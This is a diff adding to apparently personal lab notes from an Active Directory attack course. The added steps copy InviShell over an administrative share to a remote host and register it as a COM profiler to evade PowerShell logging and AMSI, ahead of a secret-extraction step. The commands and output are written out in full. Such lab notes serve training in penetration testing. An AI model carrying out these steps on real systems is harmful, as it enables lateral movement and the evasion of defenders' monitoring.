@@ -145,7 +145,66 @@ C:\AD\Tools\Rubeus.exe asktgt /domain:us.techcorp.local /user:helpdeskadmin /aes
   ASREP (key)              :  F3AC0C70B3FDB36F25C0D5C9CC552FE9F94C39B705C4088A2BB7219AE9FB6534
 
 ```
+Copy Invishishell:
 
+```
+C:\Users\studentuser17>echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\us-adconnect\C$\Users\helpdeskadmin\Downloads\InshellProf.dll
+Does \\us-adconnect\C$\Users\helpdeskadmin\Downloads\InshellProf.dll specify a file name
+or directory name on the target
+(F = file, D = directory)? F
+C:\AD\Tools\InviShell\InShellProf.dll
+1 File(s) copied
+
+>echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\us-adconnect\C$\Users\helpdeskadmin\Downloads\RunWithRegistryNonAdmin.bat
+Does \\us-adconnect\C$\Users\helpdeskadmin\Downloads\RunWithRegistryNonAdmin.bat specify a file name
+or directory name on the target
+(F = file, D = directory)? F
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+1 File(s) copied
+
+```
+Access and load invishishell:
+
+```
+C:\Users\helpdeskadmin>cd Downloads
+cd Downloads
+
+C:\Users\helpdeskadmin\Downloads>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 88AD-6C8B
+
+ Directory of C:\Users\helpdeskadmin\Downloads
+
+02/27/2023  12:09 PM    <DIR>          .
+02/27/2023  12:09 PM    <DIR>          ..
+12/31/2020  02:14 AM           117,248 InshellProf.dll
+12/31/2020  02:16 AM               544 RunWithRegistryNonAdmin.bat
+               2 File(s)        117,792 bytes
+               2 Dir(s)  13,990,985,728 bytes free
+
+C:\Users\helpdeskadmin\Downloads>.\RunWithRegistryNonAdmin.bat
+.\RunWithRegistryNonAdmin.bat
+
+C:\Users\helpdeskadmin\Downloads>set COR_ENABLE_PROFILING=1
+
+C:\Users\helpdeskadmin\Downloads>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
+
+C:\Users\helpdeskadmin\Downloads>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
+The operation completed successfully.
+
+C:\Users\helpdeskadmin\Downloads>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
+The operation completed successfully.
+
+C:\Users\helpdeskadmin\Downloads>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\Users\helpdeskadmin\Downloads\InShellProf.dll" /f
+The operation completed successfully.
+
+C:\Users\helpdeskadmin\Downloads>powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+
+```
 ## Extract secrets
 
 ```
